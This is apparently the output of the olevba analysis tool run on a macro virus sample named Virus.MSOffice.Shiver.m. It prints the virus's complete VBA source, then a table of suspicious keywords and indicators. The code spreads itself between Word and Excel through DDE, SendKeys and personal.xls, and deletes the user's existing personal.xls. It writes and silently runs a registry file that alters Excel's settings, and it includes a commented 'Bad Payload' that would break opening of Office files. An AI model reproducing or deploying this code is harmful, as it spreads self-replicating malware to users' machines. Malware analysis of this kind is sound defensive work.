olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Shiver.m
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSOffice.Shiver.m - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Virus.MSOffice.Shiver.m - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 















































Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal strClassName As String, ByVal lpWindowName As Any) As Long
Attribute FindWindow.VB_ProcData.VB_Invoke_Func = " \n14"

Public ExcelFound, WordFound, Marker, JustRun As Boolean



Sub WordStealth()
Attribute WordStealth.VB_ProcData.VB_Invoke_Func = " \n14"
Yin = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Yin < 4 Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString "Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub FileTemplates()" & vbCr & "End Sub" & vbCr & "Sub ViewVBCode()" & vbCr & "End Sub"
End If
End Sub

Sub AutoExit()
Attribute AutoExit.VB_ProcData.VB_Invoke_Func = " \n14"

Randomize

On Error GoTo out

Call CheckMarker

hWnd = FindApp("XLMain")

If hWnd <> 0 Then ExcelFound = True

If ExcelFound = False And Marker = False Then

Application.WindowState = wdWindowStateMinimize

Call PersonalFun
Shell (Application.Path + "\Excel.exe"), vbMinimizedFocus
Do While ExcelFound = False
    Call FindExcel
Loop

Application.DDETerminateAll

CNL = Application.DDEInitiate("Excel", "system")
Application.DDEExecute CNL, "[New(4)]"
Application.DDETerminate CNL

CNL = Application.DDEInitiate("Excel", "Macro1")
Application.DDEPoke CNL, Item:="R1C1", Data:="=VBA.INSERT.FILE(""c:\shiver.sys"")"
Application.DDEPoke CNL, Item:="R2C1", Data:="=SAVE.AS(""" & Application.Path & "\xlstart\personal.xls"")"
Application.DDEPoke CNL, Item:="R3C1", Data:="=Return()"
DDEExecute channel:=CNL, Command:="[Run(""R1C1"")]"
Application.DDETerminate CNL

CNL = Application.DDEInitiate("Excel", "system")
Application.DDEExecute CNL, "[RUN(""Personal.xls!PXL_Done"")]"
Application.DDETerminate CNL

Call MakeMarker

JustRun = True

End If

out:

If (Int(Rnd * 30) = 5) Then Call wdReEvalInfection

End Sub

Sub FindExcel()
Attribute FindExcel.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
For x = 1 To 50
    w = Tasks.Item(x)
    If Mid(w, 1, 15) = "Microsoft Excel" Then
        ExcelFound = True
        Exit Sub
    End If
Next x
End Sub

Function FindApp(ByVal varClassName As Variant) As Long
Attribute FindApp.VB_ProcData.VB_Invoke_Func = " \n14"
   If IsNull(varClassName) Then
      FindApp = 0
   Else
      FindApp = FindWindow(CStr(varClassName), 0&)
   End If
End Function


Sub PersonalFun()
Attribute PersonalFun.VB_ProcData.VB_Invoke_Func = " \n14"
PSLIVE = Application.Path + "\xlstart\personal.xls"
PS = Dir(PSLIVE)
If "PERSONAL.XLS" = UCase(PS) Then
Kill PSLIVE
End If
End Sub

Sub CheckMarker()
Attribute CheckMarker.VB_ProcData.VB_Invoke_Func = " \n14"
If Application.Application = "Microsoft Word" Then
mkr = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]")
Else
mkr = GetSetting("Office", "8.0", "Shiver[DDE]")
End If
If mkr = "ALT-F11" Then Marker = True
End Sub

Sub MakeMarker()
Attribute MakeMarker.VB_ProcData.VB_Invoke_Func = " \n14"
If Application.Application = "Microsoft Word" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]") = "ALT-F11"
Else
SaveSetting "Office", "8.0", "Shiver[DDE]", "ALT-F11"
End If
End Sub

Sub PXL_Done()
Attribute PXL_Done.VB_ProcData.VB_Invoke_Func = " \n14"
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
Application.Quit
End Sub

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
Application.OnSheetActivate = "ShiverTime"
End Sub

Sub ShiverTime()
Attribute ShiverTime.VB_ProcData.VB_Invoke_Func = " \n14"

Randomize

On Error Resume Next

Call xlTrigger

If UCase(Mid(ActiveWorkbook.Name, 1, 4)) = "BOOK" Then GoTo out:

Application.VBE.ActiveVBProject.VBComponents.Item("Module1").Export "c:\shiver.sys"

CommandBars("Window").Controls("Unhide...").Enabled = True
CommandBars("Tools").Controls("Macro").Enabled = True

If UCase(Dir(Application.StartupPath + "\personal.xls")) = UCase("personal.xls") Then PXLS = True

For i = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents(i).Name = "Module1" Then SXLS = True
Next i

If SXLS = False Then
ActiveWorkbook.VBProject.VBComponents.Import ("c:\shiver.sys")
ActiveWorkbook.Save
End If

If PXLS = False Then
Workbooks.Add.SaveAs FileName:=Application.StartupPath & "\personal.xls", FileFormat:=xlNormal, AddToMru:=False
ActiveWorkbook.VBProject.VBComponents.Import ("c:\shiver.sys")
ActiveWindow.Visible = False
Workbooks("personal.xls").Save
End If

out:

If UCase(Dir("c:\o6.reg")) <> "O6.REG" Or UCase(Dir("c:\o6.bat")) <> "O6.BAT" Then

Open "c:\o6.reg" For Output As 1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close 1

Open "c:\o6.bat" For Output As 1
Print #1, "regedit /s c:\o6.reg"
Close 1
End If

End Sub

Sub wdTrigger()
Attribute wdTrigger.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Randomize
Application.EnableCancelKey = wdCancelDisabled
ShowVisualBasicEditor = False
If Int(Rnd * 800) = 601 Then
For x = 1 To 16
Selection.WholeStory
Selection.Range.HighlightColorIndex = x
For y = 1 To 1000000
Next y
If x > 3 Then x = x - Int(Rnd * 3)
Next x
' REM Bad Payload REM
'System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Word.Document.8\shell\open\ddeexec", "") = "[FileExit]"
'System.PrivateProfileString("", "HKEY_CLASSES_ROOT\Excel.Sheet.8\shell\Open\ddeexec", "") = "[FileExit]"
' REM Bad Payload REM
End If
End Sub

Sub xlTrigger()
Attribute xlTrigger.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Randomize
Application.EnableCancelKey = xlDisabled
If Int(Rnd * 800) = 601 Then
For x = 1 To 30
RR = (Chr(65 + Int(Rnd * 12))) & x
Range(RR).AddComment
Range(RR).Comment.Visible = True
Range(RR).Comment.Text Text:="Shiver[DDE] by ALT-F11"
Range(RR).Comment.Shape.Select True
Selection.ShapeRange.IncrementLeft Int(Rnd * 300)
Selection.ShapeRange.IncrementTop Int(Rnd * 300)
Next x
End If
End Sub


Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"

On Error GoTo out

Call CheckMarker

hWnd = FindApp("OpusApp")

If hWnd <> 0 Then WordFound = True

If WordFound = False And Marker = False Then

Shell Application.Path & "\winword.exe", vbMinimizedFocus
CNL = Application.DDEInitiate("MSWord", "system")
Application.DDEExecute CNL, "[fileclose]"
Application.DDEExecute CNL, "[Sendkeys ""%{F11}""]"
Application.DDEExecute CNL, "[Sendkeys ""^m""]"
Call delay
SendKeys "c:\shiver.sys", Wait
SendKeys "%o"
Application.DDEExecute CNL, "[Sendkeys ""%{F4}""]"
Application.DDEExecute CNL, "[Sendkeys ""%{F4}""]"
Application.DDEExecute CNL, "[Sendkeys ""y""]"
Application.DDETerminate CNL

Call MakeMarker

JustRun = True

End If

out:

On Error Resume Next
Shell "c:\o6.bat", vbHide

If (Int(Rnd * 30) = 5) Then Call xlReEvalInfection

End Sub

Sub delay()
Attribute delay.VB_ProcData.VB_Invoke_Func = " \n14"
newHour = Hour(Now())
newMinute = Minute(Now())
newSecond = Second(Now()) + 2
waitTime = TimeSerial(newHour, newMinute, newSecond)
Application.Wait waitTime
End Sub

Sub wdReEvalInfection()
Attribute wdReEvalInfection.VB_ProcData.VB_Invoke_Func = " \n14"
If UCase(Dir(Application.Path + "\xlstart\personal.xls")) <> "PERSONAL.XLS" And Marker = True And JustRun <> True Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\VB and VBA Program Settings\Office\8.0", "Shiver[DDE]") = "NoNoNo"
End If
End Sub

Sub xlReEvalInfection()
Attribute xlReEvalInfection.VB_ProcData.VB_Invoke_Func = " \n14"
If UCase(Dir(Application.Path & "\startup\Word8.dot")) <> "WORD8.DOT" And Marker = True And JustRun <> True Then
SaveSetting "Office", "8.0", "Shiver[DDE]", "NoNoNo"
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: ./Virus.MSOffice.Shiver.m - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbMinimizedFocus    |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Sendkeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Excel.exe           |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |o6.reg              |Executable file name                         |
|IOC       |O6.REG              |Executable file name                         |
|IOC       |o6.bat              |Executable file name                         |
|IOC       |O6.BAT              |Executable file name                         |
|IOC       |winword.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

